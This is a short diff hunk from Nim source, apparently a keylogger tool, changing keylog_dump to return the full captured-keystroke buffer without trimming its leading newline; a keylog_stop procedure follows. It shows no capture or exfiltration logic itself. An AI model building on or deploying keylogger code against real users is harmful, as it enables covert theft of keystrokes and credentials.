@@ -362,7 +362,7 @@ proc keylog_dump*(): string =
             keylog_out &= tried.msg
         else:
             break
-    return keylog_out[1..<keylog_out.len]  # keylog_out[0] = '\n'
+    return keylog_out
 
 
 proc keylog_stop*(): string =
